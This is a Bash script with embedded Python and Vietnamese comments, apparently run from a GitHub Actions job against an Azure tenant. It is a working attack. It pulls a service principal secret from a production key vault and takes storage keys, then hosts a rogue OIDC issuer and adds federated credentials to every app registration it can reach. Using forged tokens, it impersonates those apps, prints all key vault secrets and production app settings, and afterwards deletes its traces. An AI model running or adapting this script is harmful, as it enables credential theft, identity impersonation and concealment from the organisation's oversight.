#!/usr/bin/env bash
# v13 — phương án sạch:
#   - ghi OIDC provider vào prefix RIÊNG /htx-<rand>/ (không đụng file đội khác)
#   - dùng sync-service-principal tạo FIC tạm trên từng app
#   - tự ký token, đổi danh tính, thử kv-tbl-sec / kv-tbl-prod / app settings
#   - XOÁ FIC tạm sau khi xong
set +e
TEN="${AZURE_TENANT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
RG=rg-tbl-platform-prod-sea; SA=sttblcilogsprodx3euoz
PROD=kv-tbl-prod-x3euoz; SEC=kv-tbl-sec-x3euoz
AUTO_APP=462d1c38-4459-48b8-9333-82e389e59514
HOST="https://$SA.z23.web.core.windows.net"
PFX="htx-$RANDOM$RANDOM"
SUBJECT="tbl-solver-htx"

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")
ASEC=$(curl -sS -H "Authorization: Bearer $KV" \
  "https://$PROD.vault.azure.net/secrets/sync-service-principal?api-version=7.4" \
  | python3 -c "
import sys,json
print(json.loads(json.load(sys.stdin)['value'])['clientSecret'])")
G=$(tok_sp "$AUTO_APP" "$ASEC" "https://graph.microsoft.com/.default")
ARM=$(tok_sp "$AUTO_APP" "$ASEC" "https://management.azure.com/.default")
KEY=$(curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
  | python3 -c "
import sys,json;print(json.load(sys.stdin)['keys'][0]['value'])")
echo "[*] graph=${#G} arm=${#ARM} key=${#KEY} prefix=$PFX"
curl -sS -H "Authorization: Bearer $G" \
  "https://graph.microsoft.com/v1.0/applications?\$top=100&\$select=id,appId,displayName" > /tmp/apps.json

pip -q install azure-storage-blob pyjwt cryptography >/dev/null 2>&1
python3 - "$SA" "$KEY" "$HOST" "$PFX" "$SUBJECT" "$TEN" "$SEC" "$PROD" "$G" "$ARM" "$SUB" "$RG" <<'PY'
import sys,json,time,uuid,base64,urllib.request,urllib.parse
from azure.storage.blob import BlobServiceClient, ContentSettings
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import jwt

sa,key,host,pfx,subject,ten,sec,prod,graph,arm,sub,rg = sys.argv[1:13]
ISS=f"{host}/{pfx}"
svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=key)
web=svc.get_container_client("$web")

priv=rsa.generate_private_key(public_exponent=65537,key_size=2048)
pn=priv.public_key().public_numbers()
b64u=lambda i: base64.urlsafe_b64encode(i.to_bytes((i.bit_length()+7)//8,'big')).decode().rstrip('=')
KID="k-"+uuid.uuid4().hex[:8]
PEM=priv.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption())
JS=json.dumps({"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":KID,"n":b64u(pn.n),"e":b64u(pn.e)}]})
CFG=json.dumps({"issuer":ISS,"jwks_uri":ISS+"/jwks.json","response_types_supported":["id_token"],
  "subject_types_supported":["public"],"id_token_signing_alg_values_supported":["RS256"]})
ct=ContentSettings(content_type="application/json")
for p,b in ((f"{pfx}/jwks.json",JS),(f"{pfx}/.well-known/jwks.json",JS),
            (f"{pfx}/.well-known/openid-configuration",CFG)):
    web.upload_blob(p,b,overwrite=True,content_settings=ct)
print("[*] OIDC provider:",ISS)

def api(url,method="GET",tok=graph,body=None):
    d=json.dumps(body).encode() if body is not None else None
    r=urllib.request.Request(url,d,method=method,
        headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(r,timeout=30) as f:
            t=f.read()
            return json.loads(t) if t else {}
    except Exception as e:
        try: return {"error":json.loads(e.read())}
        except Exception: return {"error":str(e)[:120]}

now=lambda: int(time.time())
def mint():
    n=now()
    return jwt.encode({"iss":ISS,"sub":subject,"aud":"api://AzureADTokenExchange",
        "iat":n-60,"nbf":n-60,"exp":n+900,"jti":uuid.uuid4().hex},
        PEM,algorithm="RS256",headers={"kid":KID})

def exchange(app,scope):
    d=urllib.parse.urlencode({"client_id":app,"scope":scope,"grant_type":"client_credentials",
      "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":mint()}).encode()
    try:
        with urllib.request.urlopen(urllib.request.Request(
          f"https://login.microsoftonline.com/{ten}/oauth2/v2.0/token",d),timeout=30) as f:
            return json.load(f).get("access_token","")
    except Exception as e:
        try: return "ERR:"+json.loads(e.read())["error_description"].split('\n')[0][:110]
        except Exception: return "ERR:"+str(e)[:80]

def vaults(at):
    for v in (sec,prod):
        r=api(f"https://{v}.vault.azure.net/secrets?api-version=7.4",tok=at)
        if "error" in r: print("      ",v,"denied"); continue
        print("      ",v,"OK")
        for s in r.get("value",[]):
            g=api(s["id"]+"?api-version=7.4",tok=at)
            print("        ",s["id"].split('/')[-1],"=",str(g.get("value",g))[:500])

apps=json.load(open("/tmp/apps.json"))["value"]
created=[]
for a in apps:
    oid,appid,name=a["id"],a["appId"],a["displayName"]
    nm="tmp-"+pfx[:12]
    r=api(f"https://graph.microsoft.com/v1.0/applications/{oid}/federatedIdentityCredentials",
          "POST",body={"name":nm,"issuer":ISS,"subject":subject,
                       "audiences":["api://AzureADTokenExchange"]})
    if "error" in r:
        print(f"-- {name}: FIC denied"); continue
    created.append((oid,r.get("id"),name))
    print(f"++ {name} ({appid}): FIC ok")

print("[*] chờ propagate 45s"); time.sleep(45)

for oid,fid,name in created:
    appid=[a["appId"] for a in apps if a["id"]==oid][0]
    at=exchange(appid,"https://vault.azure.net/.default")
    if str(at).startswith("ERR:") or not at:
        print(f"==== {name}: {at}"); continue
    print(f"==== {name} ({appid}) TOKEN OK")
    vaults(at)
    am=exchange(appid,"https://management.azure.com/.default")
    if am and not str(am).startswith("ERR:"):
        for site in ("app-tbl-storefront-prod","app-tbl-reporting-prod"):
            r=api(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{site}/config/appsettings/list?api-version=2022-03-01","POST",tok=am,body={})
            if "error" not in r: print("      appsettings",site,"=",json.dumps(r)[:800])

print("[*] dọn FIC tạm")
for oid,fid,name in created:
    if fid:
        api(f"https://graph.microsoft.com/v1.0/applications/{oid}/federatedIdentityCredentials/{fid}","DELETE")
print("[*] dọn blob")
for p in (f"{pfx}/jwks.json",f"{pfx}/.well-known/jwks.json",f"{pfx}/.well-known/openid-configuration"):
    try: web.delete_blob(p)
    except Exception: pass
PY
echo "================ DONE ================"
